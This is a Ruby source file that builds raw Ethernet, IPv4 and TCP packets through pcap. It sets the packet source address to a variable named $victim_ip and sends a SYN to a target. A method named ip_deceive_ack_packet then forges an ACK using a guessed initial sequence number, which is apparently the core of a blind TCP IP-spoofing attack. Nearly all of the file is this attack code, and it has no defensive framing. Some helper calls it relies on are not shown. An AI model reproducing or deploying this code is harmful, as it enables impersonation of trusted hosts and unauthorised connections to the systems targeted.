class MyPacket<FFI::PCap::Packet
	attr_accessor :etherh, :ipv4h, :tcph

	def initialize
		packet = super(nil,"")
		@etherh = EtherH.new
		@ipv4h = IPv4H.new
		@tcph = TCPH.new
		@app_data = ""
		packet
	end

	def renew
		self.body = @etherh.pack +
					  @ipv4h.pack +
					  @tcph.pack +
					  @app_data
	end

	def self.my_new_packet

		packet = MyPacket.new
		packet.instance_eval do
			@etherh = EtherH.new
				@etherh.src_mac = $src_mac
				@etherh.dst_mac = $gateway_mac
				@etherh.protocol = "\x08\x00" #ipv4

			@ipv4h = IPv4H.new
				@ipv4h.version = "0100"
				@ipv4h.head_len = "0101"
	 			@ipv4h.tos = "11111111"
	 			# @ipv4h.total_len = ""
		 		# @ipv4h.id = ""
	 			# @ipv4h.flags = ""
	 			# @ipv4h.frag_offset = ""
		 		@ipv4h.ttl = "11111111"
	 			@ipv4h.protocol = "00000110"
		 		@ipv4h.set_addr_by_arr($victim_ip, :src)
		 		@ipv4h.set_addr_by_arr($target_ip, :dst)
		 		# @ipv4h.opt_padding = ""
		 		# @ipv4h.set_check_sum()

		 	@tcph = TCPH.new
		 		@tcph.src_port = $src_port
		 		@tcph.dst_port = $dst_port
		 		@tcph.seq_num = 0x44444444
		 		@tcph.ack_num = 0x00000000
		 		# @tcph.data_offset = "0101"
		 		@tcph.data_offset = 5
		 		@tcph.reserved = "0000"
		 		@tcph.control_flag = "00000010"
		 		@tcph.win_size = 0x8000
		 		# @tcph.add_opts([0x02,0x04,0x05,0xb4],
		 		# 			   [0x01],
		 		# 			   [0x03,0x03,0x02],
		 		# 			   [0x01],
		 		# 			   [0x01],
		 		# 			   [0x04,0x02])
		 		@tcph.set_check_sum(self.fogus_head+@tcph.bit_str)

		 	@app_data = ""

		 	sum=0
		 	@ipv4h.total_len = [@ipv4h.head_len_decimal*4, @tcph.data_offset_decimal*4, @app_data.length].reduce(sum,&:+)
		 	@ipv4h.set_check_sum()

			packet.body = @etherh.pack +
					  # "\x11\x00\x7b\x17\x00\x36" + "\x7b\x17\x00\x36" +
					  @ipv4h.pack +
					  @tcph.pack +
					  @app_data
			packet
		end
	end

	def fogus_head
		@ipv4h.src_addr +
		@ipv4h.dst_addr +
		"00000000" +
		@ipv4h.protocol +
		(@tcph.data_offset_decimal*4+@app_data.length).to{|x| x=x.to_s(2); (16-x.length).times{x='0'+x}; x}
	end

	def self.ip_deceive_ack_packet(isn)
		packet = MyPacket.my_new_packet
		packet.tcph.control_flag = "00010000"
		packet.tcph.set_seq_num(1)
		packet.tcph.set_ack_num(isn+1)
		packet
	end
end
# 11 00 0b e2 00 34